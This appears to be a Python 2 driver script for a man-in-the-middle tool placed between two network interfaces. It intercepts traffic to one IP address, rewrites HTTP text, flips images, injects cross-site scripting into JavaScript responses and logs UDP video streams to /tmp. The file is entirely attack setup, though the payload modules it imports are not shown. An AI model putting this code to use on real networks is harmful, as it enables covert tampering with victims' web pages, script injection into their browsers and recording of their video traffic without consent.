#!/usr/bin/python2
import dpkt
import driver
import enum

import base
import ethernet 
import ip
import tcp
import udp
import http

import tornado.gen as gen

from base import l, connect, NetLayer

if __name__ == "__main__":
    addr = "192.168.1.10"
    alice_nic = "enp0s20u3"
    bob_nic =   "enp0s20u4"
    #addr = "192.168.1.10"
    print "Capturing traffic to:", addr

    tap = driver.FakeTap()

    loop, link_layer = ethernet.build_ethernet_loop(alice_nic, bob_nic)
    tap.mitm()

    eth_layer = ethernet.EthernetLayer()
    link_layer.register_child(eth_layer)

    ipv4_layer = ip.IPv4Layer(addr_filter=[addr])
    eth_layer.register_child(ipv4_layer, dpkt.ethernet.ETH_TYPE_IP)

    udp_layer = udp.UDPLayer()
    ipv4_layer.register_child(udp_layer, dpkt.ip.IP_PROTO_UDP)

    ssh_filter_layer = tcp.TCPPassthruLayer(ports=[22])
    ipv4_layer.register_child(ssh_filter_layer, dpkt.ip.IP_PROTO_TCP)

    tcp_layer = tcp.TCPLayer(debug=False)
    ssh_filter_layer.register_child(tcp_layer)

    http_lbf_layer = base.LineBufferLayer()
    tcp_layer.register_child(http_lbf_layer, 8000)
    tcp_layer.register_child(http_lbf_layer, 80)

    http_layer = http.HTTPLayer()
    http_lbf_layer.register_child(http_layer)

    c2b_layer = base.CloudToButtLayer()
    http_layer.register_child(c2b_layer, "text")

    img_layer = http.ImageFlipLayer()
    http_layer.register_child(img_layer, "image")

    xss_layer = http.XSSInjectorLayer()
    http_layer.register_child(xss_layer, "javascript")

    video_layer = udp.UDPVideoLayer(log_prefix="/tmp/video", passthrough=True)
    udp_layer.register_child(video_layer, 40000)

    try:
        loop.start()
    except:
        tap.passthru()

